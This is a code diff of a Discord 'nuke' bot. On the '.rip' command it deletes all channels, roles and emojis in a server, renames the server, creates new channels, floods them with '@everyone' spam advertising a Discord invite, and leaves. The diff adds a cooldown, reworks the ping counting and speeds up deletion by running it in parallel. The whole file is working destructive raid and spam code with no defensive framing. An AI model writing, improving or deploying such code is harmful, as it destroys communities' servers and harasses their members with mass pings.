@@ -28,50 +28,37 @@ app.listen(PORT, () => {
   console.log(`🌐 Web server running on http://localhost:${PORT}`);
 });
 
+// ====== COOLDOWN LOGIC ======
+const cooldowns = new Map(); // userId -> timestamp
+const cooldownDuration = 10 * 60 * 1000; // 10 minutes in ms
+
 // ====== BOT LOGIC ======
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}`);
 });
 
-let pingCount = 0;
-const maxPings = 1000;
-
-function addPing(count = 1) {
-  pingCount += count;
-  if (pingCount >= maxPings) {
-    pingCount = maxPings;
-    return true;
-  }
-  return false;
-}
-
 client.on('messageCreate', async (message) => {
   if (message.content === '.rip' && !message.author.bot) {
+    const authorId = message.author.id;
     const guild = message.guild;
     const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
+    let pingCount = 0;
+    const maxPings = 1000;
 
-    // Reset ping count for each run
-    pingCount = 0;
+    // Cooldown check
+    if (cooldowns.has(authorId)) {
+      const expirationTime = cooldowns.get(authorId) + cooldownDuration;
+      if (Date.now() < expirationTime) return;
+    }
+    cooldowns.set(authorId, Date.now());
 
-    // Delete all existing content
+    // Parallel deletion of all existing content
     await Promise.all([
-      guild.channels.cache.forEach(async (channel) => {
-        try {
-          await channel.delete();
-        } catch {}
-      }),
-      guild.roles.cache.forEach(async (role) => {
-        if (role.name !== '@everyone' && !role.managed) {
-          try {
-            await role.delete();
-          } catch {}
-        }
-      }),
-      guild.emojis.cache.forEach(async (emoji) => {
-        try {
-          await emoji.delete();
-        } catch {}
-      })
+      guild.channels.cache.map(c => c.delete().catch(() => {})),
+      guild.roles.cache
+        .filter(r => r.name !== '@everyone' && !r.managed)
+        .map(r => r.delete().catch(() => {})),
+      guild.emojis.cache.map(e => e.delete().catch(() => {}))
     ]);
 
     // Rename server
@@ -93,11 +80,11 @@ client.on('messageCreate', async (message) => {
 
     await Promise.all(createPromises);
 
-    // Spam logic - 20 messages per channel via webhook or fallback
+    // Spam logic
     const spamTasks = [];
 
     for (const channel of createdChannels) {
-      if (addPing()) break;
+      if (pingCount >= maxPings) break;
 
       spamTasks.push(
         (async () => {
@@ -110,34 +97,38 @@ client.on('messageCreate', async (message) => {
           } catch {
             // Fallback to sending directly
             for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
-              if (addPing()) break;
+              if (pingCount >= maxPings) break;
               spamTasks.push(channel.send(spamMessage).catch(() => {}));
+              pingCount++;
             }
             return;
           }
 
           for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
-            if (addPing()) break;
+            if (pingCount >= maxPings) break;
             spamTasks.push(
               webhook.send(spamMessage).catch(async () => {
                 try {
                   await channel.send(spamMessage);
-                  addPing();
+                  pingCount++;
                 } catch {}
               })
             );
+            pingCount++;
           }
         })()
       );
     }
 
-    // Run spam tasks concurrently
+    // Run all spam tasks concurrently
     await Promise.all(spamTasks);
 
     // Leave server
     try {
       await guild.leave();
     } catch {}
+
+    // DO NOT destroy client
   }
 });
 
